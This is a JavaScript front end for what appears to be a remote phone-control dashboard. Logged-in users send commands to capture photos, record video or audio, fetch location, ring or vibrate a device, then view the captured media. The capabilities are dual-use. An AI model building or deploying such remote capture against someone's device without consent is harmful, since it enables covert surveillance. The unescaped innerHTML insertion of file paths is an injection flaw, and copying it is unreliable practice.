import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

// Initialize Supabase client
const supabaseUrl = 'https://yxdnyavcxouutwkvdoef.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZG55YXZjeG91dXR3a3Zkb2VmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcwNjE0MDQsImV4cCI6MjA2MjYzNzQwNH0.y07v2koScA07iztFr366pB5f5n5UCCzc_Agn228dujI'; // Replace with your anon key
const supabase = createClient(supabaseUrl, supabaseKey);

console.log('Supabase initialized');

// Toggle sections
function showLoginSection() {
    document.getElementById('login-section').classList.remove('d-none');
    document.getElementById('commands-section').classList.add('d-none');
    document.getElementById('error-message').textContent = '';
}

function showCommandsSection() {
    document.getElementById('login-section').classList.add('d-none');
    document.getElementById('commands-section').classList.remove('d-none');
    document.getElementById('error-message').textContent = '';
}

// Login
async function login(email, password) {
    try {
        const { data, error } = await supabase.auth.signInWithPassword({ email, password });
        if (error) throw new Error(error.message);
        console.log('Login successful:', data);
        showCommandsSection();
        await loadFiles();
        await loadLastLocation();
    } catch (error) {
        console.error('Login failed:', error);
        document.getElementById('error-message').textContent = `Login failed: ${error.message}`;
    }
}

// Send command
async function sendCommand(type, options = {}) {
    try {
        const { data: user, error: userError } = await supabase.auth.getUser();
        if (userError || !user.user) throw new Error('Not authenticated');
        const command = { user_id: user.user.id, type, options };
        const { error } = await supabase.from('commands').insert(command);
        if (error) throw new Error(error.message);
        console.log(`Command sent: ${type}`, options);
    } catch (error) {
        console.error('Command failed:', error);
        document.getElementById('error-message').textContent = `Command failed: ${error.message}`;
    }
}

// Load files
async function loadFiles() {
    try {
        const { data: user, error: userError } = await supabase.auth.getUser();
        if (userError || !user.user) throw new Error('Not authenticated');
        const { data: files, error } = await supabase
            .from('files')
            .select('*')
            .eq('user_id', user.user.id)
            .order('created_at', { ascending: false });
        if (error) throw new Error(error.message);

        const tbody = document.getElementById('files-table');
        tbody.innerHTML = '';
        for (const file of files) {
            const { data: signedUrl } = await supabase.storage
                .from(file.type + 's')
                .createSignedUrl(file.path.split('/').pop(), 60);
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${file.type}</td>
                <td>${
                    file.type === 'photo' ? `<img src="${signedUrl.signedUrl}" alt="${file.path}">` :
                    file.type === 'video' ? `<video src="${signedUrl.signedUrl}" controls></video>` :
                    `<audio src="${signedUrl.signedUrl}" controls></audio>`
                }</td>
                <td>${file.path}</td>
                <td>
                    <a href="${signedUrl.signedUrl}" download class="btn btn-sm btn-primary">Download</a>
                    <button class="btn btn-sm btn-danger delete-btn" data-id="${file.id}" data-path="${file.path}" data-type="${file.type}">Delete</button>
                </td>
            `;
            tbody.appendChild(row);
        }

        // Add delete event listeners
        document.querySelectorAll('.delete-btn').forEach(btn => {
            btn.addEventListener('click', async () => {
                const id = btn.dataset.id;
                const path = btn.dataset.path;
                const type = btn.dataset.type;
                await deleteFile(id, path, type);
            });
        });
    } catch (error) {
        console.error('Load files failed:', error);
        document.getElementById('error-message').textContent = `Load files failed: ${error.message}`;
    }
}

// Delete file
async function deleteFile(id, path, type) {
    try {
        const { error: storageError } = await supabase.storage
            .from(type + 's')
            .remove([path.split('/').pop()]);
        if (storageError) throw new Error(storageError.message);
        const { error: dbError } = await supabase
            .from('files')
            .delete()
            .eq('id', id);
        if (dbError) throw new Error(dbError.message);
        console.log(`File deleted: ${path}`);
        await loadFiles();
    } catch (error) {
        console.error('Delete file failed:', error);
        document.getElementById('error-message').textContent = `Delete file failed: ${error.message}`;
    }
}

// Load last location
async function loadLastLocation() {
    try {
        const { data: user, error: userError } = await supabase.auth.getUser();
        if (userError || !user.user) throw new Error('Not authenticated');
        const { data: locations, error } = await supabase
            .from('locations')
            .select('latitude, longitude, created_at')
            .eq('user_id', user.user.id)
            .order('created_at', { ascending: false })
            .limit(1);
        if (error) throw new Error(error.message);
        const locationData = document.getElementById('location-data');
        if (locations.length > 0) {
            const { latitude, longitude, created_at } = locations[0];
            locationData.innerHTML = `Latitude: ${latitude}, Longitude: ${longitude}<br>Recorded: ${new Date(created_at).toLocaleString()}`;
        } else {
            locationData.textContent = 'No location data available';
        }
    } catch (error) {
        console.error('Load location failed:', error);
        document.getElementById('error-message').textContent = `Load location failed: ${error.message}`;
    }
}

// Event listeners
document.getElementById('login').addEventListener('click', async () => {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    await login(email, password);
});

document.getElementById('logout').addEventListener('click', async () => {
    await supabase.auth.signOut();
    showLoginSection();
    document.getElementById('error-message').textContent = 'Logged out';
});

document.getElementById('capturePhoto').addEventListener('click', async () => {
    const camera = document.getElementById('photo-camera').value;
    const flash = document.getElementById('photo-flash').value;
    await sendCommand('capturePhoto', { camera, flash });
});

document.getElementById('recordVideo').addEventListener('click', async () => {
    const camera = document.getElementById('video-camera').value;
    const quality = document.getElementById('video-quality').value;
    const duration = parseInt(document.getElementById('video-duration').value);
    await sendCommand('recordVideo', { camera, quality, duration });
});

document.getElementById('recordAudio').addEventListener('click', async () => {
    const duration = parseInt(document.getElementById('audio-duration').value);
    await sendCommand('recordAudio', { duration });
});

document.getElementById('getLocation').addEventListener('click', async () => {
    await sendCommand('getLocation');
    await loadLastLocation();
});

document.getElementById('ring').addEventListener('click', async () => {
    await sendCommand('ring', { duration: 5 });
});

document.getElementById('vibrate').addEventListener('click', async () => {
    await sendCommand('vibrate', { duration: 1 });
});

// Load files and location on page load if authenticated
supabase.auth.getSession().then(({ data: { session } }) => {
    if (session) {
        showCommandsSection();
        loadFiles();
        loadLastLocation();
    }
});
